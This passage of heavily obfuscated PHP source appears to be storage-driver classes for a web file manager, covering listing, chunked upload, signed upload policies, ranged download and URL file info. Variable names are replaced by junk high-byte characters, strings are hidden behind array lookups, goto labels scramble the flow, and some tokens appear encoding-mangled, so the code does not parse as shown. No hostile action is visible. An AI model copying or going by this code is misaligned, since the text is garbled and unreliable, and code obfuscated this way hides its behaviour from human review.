array($ËÑİ­›…[32] => $Ş÷¡˜ó‘, $ËÑİ­›…[33] => $ºªƒ®‘ª ? $ËÑİ­›…[75] : $ËÑİ­›…[210], $ËÑİ­›…[76] => $ĞŠÔÀÂ™[$ËÑİ­›…[375]], $ËÑİ­›…[1480] => $ĞŠÔÀÂ™[$ËÑİ­›…[1486]]); $this->cacheMethodInfoSet($Ş÷¡˜ó‘, $ºªƒ®‘ª, $â‰ıÓù¨); if ($ºªƒ®‘ª) { $‡÷í˜§[] = $Ş÷¡˜ó‘; if ($Ÿ§½Ô´è) { $this->fileList($Ş÷¡˜ó‘, $‡÷í˜§, $½™½ÌÀ, $Ÿ§½Ô´è); } continue; } $½™½ÌÀ[] = $â‰ıÓù¨; } if (count($õ–Çõƒ¦) < $İíÌÕø) { break; } } $this->cacheMethodInfoSet($ÈÅè©µ, !0); } public function listPath($•‰¦±¯¸, $µÎùÊâ„ = false) { $¥»³µÚı =& $_SERVER[”ú…±Ú¥]; $õ€ù‰Ïº = $“¡‚Ÿ¯í = array(); $this->fileList($•‰¦±¯¸, $õ€ù‰Ïº, $“¡‚Ÿ¯í); foreach ($õ€ù‰Ïº as $õ¦ç¤çÆ => $ÕĞ¹) { $õ€ù‰Ïº[$õ¦ç¤çÆ] = $this->folderInfo($ÕĞ¹, $µÎùÊâ„); } foreach ($“¡‚Ÿ¯í as $õ¦ç¤çÆ => $ÕĞ¹) { $“¡‚Ÿ¯í[$õ¦ç¤çÆ] = $this->fileInfo($ÕĞ¹[$¥»³µÚı[32]], $µÎùÊâ„, $ÕĞ¹); } return array($¥»³µÚı[82] => $õ€ù‰Ïº, $¥»³µÚı[83] => $“¡‚Ÿ¯í); } public function has($ğüÕ¬ëµ, $Ï«µ› = false, $şÏ¥Ú« = true) { $ÌŸ“µ… =& $_SERVER[”ú…±Ú¥]; $ıñ—ÀÇ© = $ÌŸ“µ…[12]; $°É†À = 500; $¹…Œ‚çË = 0; $Ä¶¬äëŞ = 0; $¾Ğ·ÌÑ× = rtrim($ğüÕ¬ëµ, $ÌŸ“µ…[8]) . $ÌŸ“µ…[8]; while (!0) { check_abort(); $âÈÚÄ‚¯ = $this->listObjs($ğüÕ¬ëµ, $ıñ—ÀÇ©, $°É†À); if (!$âÈÚÄ‚¯) { return !1; } $ıñ—ÀÇ© = isset($âÈÚÄ‚¯[$ÌŸ“µ…[1484]]) ? $âÈÚÄ‚¯[$ÌŸ“µ…[1484]] : $ÌŸ“µ…[12]; $‰ØäÁÌ = isset($âÈÚÄ‚¯[$ÌŸ“µ…[1485]]) ? $âÈÚÄ‚¯[$ÌŸ“µ…[1485]] : array(); if (empty($‰ØäÁÌ)) { break; } $×‰¾÷ëå = array_filter($‰ØäÁÌ, function ($Á¥ñ”ìİ) { $¢´ÃµËÔ =& $_SERVER[”ú…±Ú¥]; return $Á¥ñ”ìİ[$¢´ÃµËÔ[33]] == $¢´ÃµËÔ[75]; }); $ÒÇ¸–´Ê = count($‰ØäÁÌ); $×‰¾÷ëå = count($×‰¾÷ëå); $éúó‰Â = $ÒÇ¸–´Ê - $×‰¾÷ëå; if ($Ï«µ›) { $Ä¶¬äëŞ += $×‰¾÷ëå; $¹…Œ‚çË += $éúó‰Â; if ($ÒÇ¸–´Ê < $°É†À) { break; } continue; } if ($şÏ¥Ú«) { if ($éúó‰Â) { return !0; } } else { if ($×‰¾÷ëå) { return !0; } } if ($ÒÇ¸–´Ê < $°É†À) { break; } } if ($Ï«µ›) { return array($ÌŸ“µ…[217] => $¹…Œ‚çË, $ÌŸ“µ…[218] => $Ä¶¬äëŞ); } return !1; } public function listAll($ËÆº¤µĞ) { $æôß±« =& $_SERVER[”ú…±Ú¥]; $›éş¡ = $Œ¼›†À• = array(); $this->fileList($ËÆº¤µĞ, $›éş¡, $Œ¼›†À•, !0); $°óæöİö = array_to_keyvalue($Œ¼›†À•, $æôß±«[32]); foreach ($›éş¡ as $ü½¿îî) { if (is_string($ü½¿îî)) { $°óæöİö[$ü½¿îî] = array($æôß±«[76] => 0); } } return $this->listAllFiles($ËÆº¤µĞ, $°óæöİö); } public function canRead($ò°’¾÷) { return $this->exist($ò°’¾÷) ? !0 : !1; } public function canWrite($ÇÑÑµè©) { return $this->exist($ÇÑÑµè©) ? !0 : !1; } public function getContent($±ßëïƒ) { return $this->fileSubstr($±ßëïƒ, 0, -1); } public function setContent($ôÁİ æÉ, $ÒªàÈ² = '') { $¿¡êúÜĞ =& $_SERVER[”ú…±Ú¥]; if (!$ÒªàÈ²) { $âÕõö¸ô = $this->ussRequest($ôÁİ æÉ, $¿¡êúÜĞ[236]); return $âÕõö¸ô[$¿¡êúÜĞ[1241]]; } $«‘®ğ÷ = $this->tempFile($this->pathThis($ôÁİ æÉ)); file_put_contents($«‘®ğ÷, $ÒªàÈ²); if ($this->upload($ôÁİ æÉ, $«‘®ğ÷)) { $this->tempFileRemve($«‘®ğ÷); return !0; } return !1; } public function fileSubstr($Øù€–ˆ, $üÅßûûˆ, $ğ¸¿Ò¥ú) { $‡ç›²«» =& $_SERVER[”ú…±Ú¥]; if (!($Ÿ°šˆè© = $this->link($Øù€–ˆ))) { return !1; } $£­ú¥» = !1; if ($ğ¸¿Ò¥ú > 0) { $âÖ³­… = $üÅßûûˆ + $ğ¸¿Ò¥ú - 1; $£­ú¥» = array($‡ç›²«»[1447] . $üÅßûûˆ . $‡ç›²«»[424] . $âÖ³­…); } $ï‹–Ø´æ = url_request($Ÿ°šˆè©, $‡ç›²«»[240], !1, $£­ú¥»); return $ï‹–Ø´æ[$‡ç›²«»[782]] ? $ï‹–Ø´æ[$‡ç›²«»[1231]] : !1; } public function upload($…µÔŸ‚î, $¦»£¶¡‹, $‹µşåëÜ = false, $¯¢‘”òÜ = REPEAT_REPLACE) { $œ«Õá… =& $_SERVER[”ú…±Ú¥]; $ÑëŒÖÒ = IO::size($¦»£¶¡‹); if ($ÑëŒÖÒ <= 1024 * 1024 * 200) { $­¥ÛÇîÉ = array($œ«Õá…[1487] . $¦»£¶¡‹); $ú·üì­® = $this->ussRequest($…µÔŸ‚î, $œ«Õá…[238], $­¥ÛÇîÉ); return $ú·üì­®[$œ«Õá…[1241]] ? $this->getPathOuter($…µÔŸ‚î) : !1; } $î•ÃÜÂ = 1024 * 1024 * 10; $ï•´”ĞÃ = array($œ«Õá…[1488], $œ«Õá…[1489] . $ÑëŒÖÒ, $œ«Õá…[1490], $œ«Õá…[1491] . $î•ÃÜÂ); $ú·üì­® = $this->ussRequest($…µÔŸ‚î, $œ«Õá…[238], !1, $ï•´”ĞÃ); if (!$ú·üì­®[$œ«Õá…[1241]]) { return !1; } $Ö¨·…ˆÅ = $ú·üì­®[$œ«Õá…[1231]]; $ŒŞôÀ÷ = 0; $üå¨ò­¯ = $Ö¨·…ˆÅ[$œ«Õá…[1492]]; $Ÿ‰ÊÇæà = fopen($¦»£¶¡‹, $œ«Õá…[1396]); if (!$Ÿ‰ÊÇæà) { return !1; } do { $œÇµ®ÙÏ = $Ö¨·…ˆÅ[$œ«Õá…[1493]]; fseek_64($Ÿ‰ÊÇæà, $ŒŞôÀ÷); $Î»È‘‚— = fread($Ÿ‰ÊÇæà, $œÇµ®ÙÏ); $ˆşÏ…¯ = 0; do { $ˆşÏ…¯++; $Ö¨·…ˆÅ = $this->uploadPart($…µÔŸ‚î, $Ö¨·…ˆÅ, $Î»È‘‚—); } while (!$Ö¨·…ˆÅ && $ˆşÏ…¯ < 3); if (!$Ö¨·…ˆÅ) { return !1; } $üå¨ò­¯ = $Ö¨·…ˆÅ[$œ«Õá…[1492]]; $ŒŞôÀ÷ += $œÇµ®ÙÏ; } while ($üå¨ò­¯ != -1); fclose($Ÿ‰ÊÇæà); $ï•´”ĞÃ = array($œ«Õá…[1494], $œ«Õá…[1495] . $Ö¨·…ˆÅ[$œ«Õá…[1496]], $œ«Õá…[1490]); $ú·üì­® = $this->ussRequest($…µÔŸ‚î, $œ«Õá…[238], !1, $ï•´”ĞÃ); return $ú·üì­®[$œ«Õá…[1241]] ? $this->getPathOuter($ş‚óÉâÃ) : !1; } private function uploadPart($¶²ÉµŒ, $ÊŒõ¼¨é, &$ŒÔÈ²÷) { $†´åÕıù =& $_SERVER[”ú…±Ú¥]; $ù·••Œ¦ = array($†´åÕıù[1497], $†´åÕıù[1495] . $ÊŒõ¼¨é[$†´åÕıù[1496]], $†´åÕıù[1498] . $ÊŒõ¼¨é[$†´åÕıù[1492]], $†´åÕıù[142] . $ÊŒõ¼¨é[$†´åÕıù[1493]]); $Ô“Ÿ¶ô† = $this->ussRequest($¶²ÉµŒ, $†´åÕıù[238], $ŒÔÈ²÷, $ù·••Œ¦); return !$Ô“Ÿ¶ô†[$†´åÕıù[1241]] ? $Ô“Ÿ¶ô†[$†´åÕıù[1241]] : $Ô“Ÿ¶ô†[$†´åÕıù[1231]]; } public function uploadFormData($áşÑ¸Ñ, $§Ó›¡Ñ« = 3600) { return $this->uploadPolicy($áşÑ¸Ñ, $§Ó›¡Ñ«); } public function multiUploadFormData($¹ã½‡‡¾, $ŸŸ¡¶ïĞ = 3600) { $éı»˜ˆ =& $_SERVER[”ú…±Ú¥]; $ÀÚú‘±Ù = (int) $GLOBALS[$éı»˜ˆ[7]][$éı»˜ˆ[76]]; return $this->uploadPolicy($¹ã½‡‡¾, $ŸŸ¡¶ïĞ, $ÀÚú‘±Ù); } private function uploadPolicy($©¿îëš—, $Â½Æìğ = 3600, $Ÿàë”¸± = 0) { $ĞĞ”ıçÆ =& $_SERVER[”ú…±Ú¥]; $ßØ•òºÊ = $ĞĞ”ıçÆ[8] . $this->bucket; $È˜åõİ = gmdate($ĞĞ”ıçÆ[1432]); $§§œøÄê = array($ĞĞ”ıçÆ[1499] => $this->bucket, $ĞĞ”ıçÆ[1500] => $©¿îëš—, $ĞĞ”ıçÆ[1501] => time() + $Â½Æìğ, $ĞĞ”ıçÆ[1502] => $È˜åõİ); if ($Ÿàë”¸±) { $§§œøÄê[$ĞĞ”ıçÆ[1412]] = $Ÿàë”¸±; } $ã‰‚³ÉÉ = base64_encode(json_encode($§§œøÄê)); $ÁšÕĞÏ¶ = base64_encode(hash_hmac($ĞĞ”ıçÆ[1469], "\120\117\123\124\x26{$ßØ•òºÊ}\x26{$È˜åõİ}\x26{$ã‰‚³ÉÉ}", md5("{$this->userpass}"), !0)); $ñø‚‹š = array($ĞĞ”ıçÆ[270] => $ã‰‚³ÉÉ, $ĞĞ”ıçÆ[1503] => "\125\120\x59\125\116\x20{$this->username}\72{$ÁšÕĞÏ¶}", $ĞĞ”ıçÆ[182] => $this->endpoint . $ßØ•òºÊ); return $ñø‚‹š; } public function download($ª²¼ğë², $ç¤Çæ¨Ê) { $ß·†Î†ı = IO::getPathInner(IO::mkfile($ç¤Çæ¨Ê)); if (!($¿³ˆ¨‹± = $this->link($ª²¼ğë²))) { return !1; } $¾¢ã¹ñŒ = 0; $ß£ˆª³¶ = 1024 * 200; $îù÷ûÁÄ = fopen($ß·†Î†ı, $_SERVER[”ú…±Ú¥][1453]); while (!0) { $ôâ¬Ó‰ = $this->fileSubstr($ª²¼ğë², $¾¢ã¹ñŒ, $ß£ˆª³¶); if ($ôâ¬Ó‰ === !1) { return !1; } fwrite($îù÷ûÁÄ, $ôâ¬Ó‰); $¾¢ã¹ñŒ += $ß£ˆª³¶; if (strlen($ôâ¬Ó‰) < $ß£ˆª³¶) { break; } } fclose($îù÷ûÁÄ); return $ç¤Çæ¨Ê; } public function link($¢¨™™ú‹, $È½µ½… = array()) { $·êŞÙ›¾ =& $_SERVER[”ú…±Ú¥]; $¢¨™™ú‹ = trim($¢¨™™ú‹, $·êŞÙ›¾[8]); if (!empty($this->token)) { $ƒ˜«‡ÚÜ = strtotime(date($·êŞÙ›¾[1504])); $¢¤©ÖÏ¿ = substr(md5($this->token . $·êŞÙ›¾[322] . $ƒ˜«‡ÚÜ . $·êŞÙ›¾[1505] . $¢¨™™ú‹), 12, 8) . $ƒ˜«‡ÚÜ; $È½µ½…[] = $·êŞÙ›¾[1506] . $¢¤©ÖÏ¿; } $®¸Íº·¸ = !empty($È½µ½…) ? $·êŞÙ›¾[73] . implode($·êŞÙ›¾[322], $È½µ½…) : $·êŞÙ›¾[12]; return $this->getHost() . $·êŞÙ›¾[8] . $¢¨™™ú‹ . $®¸Íº·¸; } public function fileOut($¤àòÎ¹, $°‡È›ƒ¿ = false, $ëÜñ”Á” = false, $ı¾Ã† = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($¤àòÎ¹, $°‡È›ƒ¿, $ëÜñ”Á”, $ı¾Ã†); } if (!$ëÜñ”Á”) { $ëÜñ”Á” = $this->pathThis($¤àòÎ¹); } $£¶Î–Ã… = $°‡È›ƒ¿ ? array($_SERVER[”ú…±Ú¥][1507] . rawurlencode($ëÜñ”Á”)) : array(); $Â­•¢ó© = $this->link($¤àòÎ¹, $£¶Î–Ã…); $this->fileOutLink($Â­•¢ó©); } public function fileOutServer($‡ÃÄ“ß, $âÉ½áäö = false, $š×‹Æ Ï = false, $•Òê×¨ü = '') { parent::fileOut($‡ÃÄ“ß, $âÉ½áäö, $š×‹Æ Ï, $•Òê×¨ü); } public function fileOutImage($ÈÕÚù¦, $Ì’…Ù“ = 250) { $‘ˆ¨—“† = $this->link($ÈÕÚù¦ . $_SERVER[”ú…±Ú¥][1508] . $Ì’…Ù“); $this->fileOutLink($‘ˆ¨—“†); } public function fileOutImageServer($°µ‘ÕË, $®©Ú‰„Ò = 250) { parent::fileOutImage($°µ‘ÕË, $®©Ú‰„Ò); } public function hashMd5($”äÊ‚ÄÊ) { $‡‰¸Úİ„ =& $_SERVER[”ú…±Ú¥]; $ÍùòÓò¤ = $this->_objectMeta($”äÊ‚ÄÊ); return isset($ÍùòÓò¤[$‡‰¸Úİ„[222]]) ? $ÍùòÓò¤[$‡‰¸Úİ„[222]] : !1; } public function size($ĞÛıÕÏ ) { $¨É±àª = $this->objectMeta($ĞÛıÕÏ ); return $¨É±àª ? $¨É±àª[$_SERVER[”ú…±Ú¥][76]] : 0; } public function info($…öĞ“ğ«) { if ($this->isFolder($…öĞ“ğ«)) { return $this->folderInfo($…öĞ“ğ«); } else { if ($this->isFile($…öĞ“ğ«)) { return $this->fileInfo($…öĞ“ğ«); } } return !1; } public function exist($Éê ¤ˆ£) { return $this->isFile($Éê ¤ˆ£) || $this->isFolder($Éê ¤ˆ£); } public function isFile($¹¦¬ƒÉç) { return !$this->isFolder($¹¦¬ƒÉç) && $this->objectMeta($¹¦¬ƒÉç); } public function isFolder($¤ÊÒîÏè) { return $this->cacheMethod($_SERVER[”ú…±Ú¥][165], $¤ÊÒîÏè); } protected function objectMeta($À“Ø­Ğ˜) { return $this->cacheMethod($_SERVER[”ú…±Ú¥][167], $À“Ø­Ğ˜); } protected function _objectMeta($÷ÅÛºÑ²) { $ñ†ªĞÙ =& $_SERVER[”ú…±Ú¥]; if ($÷ÅÛºÑ² == $ñ†ªĞÙ[12] || $÷ÅÛºÑ² == $ñ†ªĞÙ[8]) { return array(); } $Ğ½‡Üæ¥ = $this->ussRequest($÷ÅÛºÑ², $ñ†ªĞÙ[1509]); if (!$Ğ½‡Üæ¥[$ñ†ªĞÙ[1241]]) { return null; } $£õã¿‡Ÿ = isset($Ğ½‡Üæ¥[$ñ†ªĞÙ[1231]]) ? $Ğ½‡Üæ¥[$ñ†ªĞÙ[1231]] : array(); if (!isset($£õã¿‡Ÿ[$ñ†ªĞÙ[1510]])) { return null; } $ÖÑäÖƒ¥ = array($ñ†ªĞÙ[33] => isset($£õã¿‡Ÿ[$ñ†ªĞÙ[1510]]) ? $£õã¿‡Ÿ[$ñ†ªĞÙ[1510]] : null, $ñ†ªĞÙ[76] => isset($£õã¿‡Ÿ[$ñ†ªĞÙ[1511]]) ? $£õã¿‡Ÿ[$ñ†ªĞÙ[1511]] : null, $ñ†ªĞÙ[222] => isset($£õã¿‡Ÿ[$ñ†ªĞÙ[1512]]) ? $£õã¿‡Ÿ[$ñ†ªĞÙ[1512]] : null, $ñ†ªĞÙ[1479] => isset($£õã¿‡Ÿ[$ñ†ªĞÙ[1513]]) ? $£õã¿‡Ÿ[$ñ†ªĞÙ[1513]] : null); $ÖÑäÖƒ¥[$ñ†ªĞÙ[1480]] = isset($£õã¿‡Ÿ[$ñ†ªĞÙ[1514]]) ? strtotime($£õã¿‡Ÿ[$ñ†ªĞÙ[1514]]) : $ÖÑäÖƒ¥[$ñ†ªĞÙ[1479]]; return $ÖÑäÖƒ¥; } protected function _isFolder($õÛ€¶ß‘) { $îüõ•àå =& $_SERVER[”ú…±Ú¥]; if ($õÛ€¶ß‘ == $îüõ•àå[12] || $õÛ€¶ß‘ == $îüõ•àå[8]) { return !0; } $²ûØßôÈ = $this->_objectMeta($õÛ€¶ß‘); return isset($²ûØßôÈ[$îüõ•àå[33]]) && $²ûØßôÈ[$îüõ•àå[33]] == $îüõ•àå[75] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Îà•ÀÕˆ = false) { } public function exist($Ù™Áõ¤) { $ı½¥Ó¥ƒ = $this->info($Ù™Áõ¤); return $ı½¥Ó¥ƒ[$_SERVER[”ú…±Ú¥][212]]; } public function isFile($¹æ¥úø) { $Ò÷¸áäÔ = $this->info($¹æ¥úø); return $Ò÷¸áäÔ[$_SERVER[”ú…±Ú¥][212]]; } public function isFolder($º”¥·Ø¸) { return !1; } public function size($Ï•Ğ´™‚) { $îŒåêü¸ = $this->info($Ï•Ğ´™‚); return $îŒåêü¸[$_SERVER[”ú…±Ú¥][76]]; } public function info($ÜÊ—†ƒ) { return $this->infoParse($ÜÊ—†ƒ); } public function infoAuth($Î°î¢êš) { return $this->infoParse($Î°î¢êš); } public function infoWithChildren($óÀÎ“æû) { return $this->infoParse($óÀÎ“æû); } public function infoFull($íÓË±ö‚) { return $this->infoParse($íÓË±ö‚); } private function infoParse($ê¼‰İôÖ) { $™éáˆƒ =& $_SERVER[”ú…±Ú¥]; $Ñ£¥ÔÀğ = $this->header($ê¼‰İôÖ); if (!$Ñ£¥ÔÀğ || !$Ñ£¥ÔÀğ[$™éáˆƒ[782]]) { return !1; } $±É‘ìèØ = _get($Ñ£¥ÔÀğ, $™éáˆƒ[375], 0); $––âÙÔş = array($™éáˆƒ[32] => $Ñ£¥ÔÀğ[$™éáˆƒ[32]], $™éáˆƒ[84] => $ê¼‰İôÖ, $™éáˆƒ[33] => $™éáˆƒ[210], $™éáˆƒ[76] => intval($±É‘ìèØ), $™éáˆƒ[174] => get_path_ext($Ñ£¥ÔÀğ[$™éáˆƒ[32]]), $™éáˆƒ[1393] => $±É‘ìèØ > 0 && $Ñ£¥ÔÀğ[$™éáˆƒ[1515]], $™éáˆƒ[1394] => !1); return $––âÙÔş; } private function header($¶›“¬ùÀ) { $‹‘‘¦Çö =& $_SERVER[”ú…±Ú¥]; if (isset(self::$_cacheHeader[$¶›“¬ùÀ])) { return self::$_cacheHeader[$¶›“¬ùÀ]; } $µ¦ïÔ¹µ = isset($GLOBALS[$‹‘‘¦Çö[1516]]) ? $GLOBALS[$‹‘‘¦Çö[1516]] : !1; $GLOBALS[$‹‘‘¦Çö[1516]] = !0; self::$_cacheHeader[$¶›“¬ùÀ] = url_header($¶›“¬ùÀ); $GLOBALS[$‹‘‘¦Çö[1516]] = $µ¦ïÔ¹µ; return self::$_cacheHeader[$¶›“¬ùÀ]; } public function hashSimple($ÙØšı°Ä, $ê·«Å•˜ = false) { $ù–æ‡Ïş =& $_SERVER[”ú…±Ú¥]; $ø—ú¶è = $this->info($ÙØšı°Ä); if (!$ø—ú¶è || !$ø—ú¶è[$ù–æ‡Ïş[212]]) { return !1; } $‹–Õó÷¡ = $ø—ú¶è[$ù–æ‡Ïş[76]]; $× Š¦š© = 200; $öƒ©’  = 50; if ($‹–Õó÷¡ <= $× Š¦š© * $öƒ©’ ) { return md5($this->fileSubstr($ÙØšı°Ä, 0, $‹–Õó÷¡)) . $‹–Õó÷¡; } $ÜÏ×Œ¤ = intval($‹–Õó÷¡ / $öƒ©’ ); $İõºöå = $ù–æ‡Ïş[12]; $ğ£ğ¤ = timeFloat(); $ù¤ş‹äÅ = 15; for ($ÁÛÉªŒ = 0; $ÁÛÉªŒ < $öƒ©’ ; $ÁÛÉªŒ++) { if (timeFloat() - $ğ£ğ¤ > $ù¤ş‹äÅ) { return !1; } $¹‰Ëå”ñ = $this->fileSubstr($ÙØšı°Ä, $ÜÏ×Œ¤ * $ÁÛÉªŒ, $× Š¦š©); if (!$¹‰Ëå”ñ) { return !1; } $İõºöå .= $¹‰Ëå”ñ; } $İõºöå .= $this->fileSubstr($ÙØšı°Ä, $‹–Õó÷¡ - $× Š¦š©, $× Š¦š©); return md5($İõºöå) . $‹–Õó÷¡; } public function getContent($¨õªœ™÷) { return $this->fileSubstr($¨õªœ™÷); } public function fileSubstr($„ªÎÒ¿¶, $Ü³×®ñ¼ = 0, $ƒ¼çŒªİ = -1) { $üŸùÑ¹ =& $_SERVER[”ú…±Ú¥]; $û¿ù¯‰ï = $this->info($„ªÎÒ¿¶); if (!$û¿ù¯‰ï || !$û¿ù¯‰ï[$üŸùÑ¹[212]] && $û¿ù¯‰ï[$üŸùÑ¹[76]] > 1024 * 1024 * 10) { return !1; } if ($ƒ¼çŒªİ === -1) { $ƒ¼çŒªİ = $û¿ù¯‰ï[$üŸùÑ¹[76]]; } if ($ƒ¼çŒªİ == 0) { return $üŸùÑ¹[12]; } $¥ğäƒ ô = array($üŸùÑ¹[1517] . $Ü³×®ñ¼ . $üŸùÑ¹[814] . ($Ü³×®ñ¼ + $ƒ¼çŒªİ - 1)); $Œ¥ÊĞÌ½ = url_request($„ªÎÒ¿¶, $üŸùÑ¹[240], !1, $¥ğäƒ ô, !1, !1, 30); return $Œ¥ÊĞÌ½[$üŸùÑ¹[1231]] ? $Œ¥ÊĞÌ½[$üŸùÑ¹[1231]] : $üŸùÑ¹[12]; } public function download($¡ú²ê•, $Â¿ïÒ§ó) { Downloader::start($¡ú²ê•, $Â¿ïÒ§ó); return $Â¿ïÒ§ó; } } goto bé¹ï Ş Ñ; a´¤ÜÂÒ±º: define($_SERVER[”ú…±Ú¥][278], 3); define($_SERVER[”ú…±Ú¥][279], 1); define($_SERVER[”ú…±Ú¥][280], 0); goto fİ²­Š¹õ; Aé‰Ù»Éµ’: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $‡„ÉËÏå =& $_SERVER[”ú…±Ú¥]; $this->objectDriver = array($‡„ÉËÏå[60], $‡„ÉËÏå[61], $‡„ÉËÏå[62], $‡„ÉËÏå[63], $‡„ÉËÏå[64], $‡„ÉËÏå[65], $‡„ÉËÏå[66], $‡„ÉËÏå[67], $‡„ÉËÏå[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($êí˜³ë) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($êí˜³ë, $_SERVER[”ú…±Ú¥][8]); } return $êí˜³ë; } public function iconvApp($ÒÊ®å±Ï) { return $ÒÊ®å±Ï; } public function iconvSystem($úÍ»İâ) { return $úÍ»İâ; } public function iconvTo($ïèÜ”ô×, $ºŸãÏ…ò, $ŞƒÉüÏƒ) { $ Ä©­•Ö =& $_SERVER[”ú…±Ú¥]; if (!$ïèÜ”ô× || !function_exists($ Ä©­•Ö[69])) { return $ïèÜ”ô×; } static $õØŠÓ¯¹ = array(); $ÔšœÌ˜ = $ºŸãÏ…ò . $ Ä©­•Ö[70] . $ŞƒÉüÏƒ . $ Ä©­•Ö[71] . $ïèÜ”ô×; if (isset($õØŠÓ¯¹[$ÔšœÌ˜])) { return $õØŠÓ¯¹[$ÔšœÌ˜]; } if (function_exists($ Ä©­•Ö[72])) { $½ï˜™´ = @mb_convert_encoding($ïèÜ”ô×, $ŞƒÉüÏƒ, $ºŸãÏ…ò); } else { $½ï˜™´ = @iconv($ºŸãÏ…ò, $ŞƒÉüÏƒ, $ïèÜ”ô×); } $½ï˜™´ = $½ï˜™´ ? $½ï˜™´ : $ïèÜ”ô×; if (strstr($½ï˜™´, $ Ä©­•Ö[73])) { $½ï˜™´ = str_replace($ Ä©­•Ö[73], $ Ä©­•Ö[11], $½ï˜™´); } $õØŠÓ¯¹[$ºŸãÏ…ò . $ Ä©­•Ö[70] . $ŞƒÉüÏƒ . $ Ä©­•Ö[71] . $ïèÜ”ô×] = $½ï˜™´; $õØŠÓ¯¹[$ŞƒÉüÏƒ . $ Ä©­•Ö[70] . $ºŸãÏ…ò . $ Ä©­•Ö[71] . $ïèÜ”ô×] = $ïèÜ”ô×; $õØŠÓ¯¹[$ŞƒÉüÏƒ . $ Ä©­•Ö[70] . $ºŸãÏ…ò . $ Ä©­•Ö[71] . $½ï˜™´] = $ïèÜ”ô×; $õØŠÓ¯¹[$ºŸãÏ…ò . $ Ä©­•Ö[70] . $ŞƒÉüÏƒ . $ Ä©­•Ö[71] . $½ï˜™´] = $½ï˜™´; return $½ï˜™´; } public function getPathInner($öš˜İ™) { $ŠĞ‘ÒÕ€ = IO::init($öš˜İ™); return $ŠĞ‘ÒÕ€->path; } public function getPathOuter($¸î“ˆô¡) { $¢ƒÄÓÆÖ =& $_SERVER[”ú…±Ú¥]; $ïˆÛ«õŞ = strlen(trim($this->pathBase, $¢ƒÄÓÆÖ[8])); $¸î“ˆô¡ = substr(trim($¸î“ˆô¡, $¢ƒÄÓÆÖ[8]), $ïˆÛ«õŞ); return $this->pathDriver . $¢ƒÄÓÆÖ[8] . ltrim($¸î“ˆô¡, $¢ƒÄÓÆÖ[8]); } public function isParentOf($·²ÂŸ—Ó, $¦œÛ¿») { $§³£ÜÒĞ =& $_SERVER[”ú…±Ú¥]; $·²ÂŸ—Ó = rtrim(strtolower($·²ÂŸ—Ó), $§³£ÜÒĞ[8]) . $§³£ÜÒĞ[8]; $¦œÛ¿» = rtrim(strtolower($¦œÛ¿»), $§³£ÜÒĞ[8]) . $§³£ÜÒĞ[8]; $š²®¶Û = strpos($¦œÛ¿», $·²ÂŸ—Ó) === 0; return $š²®¶Û; } public function getType() { $Ñ†™Å˜ =& $_SERVER[”ú…±Ú¥]; $»Ğ™ç = str_replace($Ñ†™Å˜[74], $Ñ†™Å˜[12], get_class($this)); return strtolower($»Ğ™ç); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($¥¸­«Ïš, $á É“òŒ) { $ğ‡ú¹¶Á =& $_SERVER[”ú…±Ú¥]; $§Ü‡İÒË = rtrim($¥¸­«Ïš, $ğ‡ú¹¶Á[8]) . $ğ‡ú¹¶Á[8] . $á É“òŒ; $’ûÇ§ = $this->exist($§Ü‡İÒË); return $’ûÇ§ ? $§Ü‡İÒË : !1; } public function setModifyTime($‰›ÎÍÄ, $»œÉ•¯ä = '') { } public function renameObject($ÇÕâğÆ¥, $ØóÉøç) { $áÍ¼œû‚ = $ØóÉøç; $ÇÕâğÆ¥ = $this->getPathOuter($ÇÕâğÆ¥); $ØóÉøç = $this->pathFather($ÇÕâğÆ¥) . $ØóÉøç; $»´Õùã¿ = IO::copy($ÇÕâğÆ¥, $this->pathFather($ÇÕâğÆ¥), REPEAT_RENAME_FOLDER, $áÍ¼œû‚); if ($»´Õùã¿) { IO::remove($ÇÕâğÆ¥); } return $»´Õùã¿ ? $ØóÉøç : !1; } public function tempFile($‘“Ø€¼ú = '', $«Ø×¾±• = '') { if (!$‘“Ø€¼ú) { $‘“Ø€¼ú = rand_string(15); } $œ“ÆßîÃ = TEMP_FILES . rand_string(15) . $_SERVER[”ú…±Ú¥][8]; @mkdir($œ“ÆßîÃ, DEFAULT_PERRMISSIONS, !0); $ÏÈ‚“Ëç = $œ“ÆßîÃ . $‘“Ø€¼ú; @touch($ÏÈ‚“Ëç); if ($«Ø×¾±•) { file_put_contents($ÏÈ‚“Ëç, $«Ø×¾±•); } return $ÏÈ‚“Ëç; } public function tempFileRemve($îŒÑÏ÷) { @unlink($îŒÑÏ÷); @rmdir($this->pathFather($îŒÑÏ÷)); } public function mkfile($¿ÆŒ‚¡³, $Òèóƒ÷Ë = '', $á³å”ŒÄ = REPEAT_RENAME) { } public function mkdir($áÆşå× , $©ƒ»üëŸ = REPEAT_SKIP) { } public function delFile($¹ò¬–Ã) { } public function delFolder($°«Ææ½) { } public function copyFile($‘Å§Šæœ, $®‘»¡Ë©) { } public function moveFile($ÀºŒÈ¶ô, $È·€± ÷) { } public function remove($‡Î´ç¢¯) { if ($this->isFile($‡Î´ç¢¯)) { return $this->delFile($‡Î´ç¢¯); } return $this->delFolder($‡Î´ç¢¯); } public function rename($¶ÉÍìÀ´, $Ö›ôáğÕ) { } public function exist($Ñäó°Şø) { } public function findByHash($ããõ½ÓÌ = '', $àôœİÉ± = '') { return !1; } public function isFile($¿„‹ úª) { } public function isFolder($ö¢¾Ú†¥) { } public function size($Ì‹Ù¸´Ø) { } public function info($•Êú‰“˜) { } public function infoSimple($ëÏ…ëÙ) { return $this->info($ëÏ…ëÙ); } public function infoAuth($ìÛ›ºñ¥) { return $this->info($ìÛ›ºñ¥); } public function infoFull($Î§»úº¹) { return $this->info($Î§»úº¹); } public function infoWithChildren($‘ú«—Ğ) { $ù“¶«ş¼ =& $_SERVER[”ú…±Ú¥]; static $áˆ«Ú–ì = array(); if (isset($áˆ«Ú–ì[$‘ú«—Ğ])) { return $áˆ«Ú–ì[$‘ú«—Ğ]; } $£µ÷„ŠÛ = $this->info($‘ú«—Ğ); if ($£µ÷„ŠÛ && $£µ÷„ŠÛ[$ù“¶«ş¼[33]] == $ù“¶«ş¼[75]) { 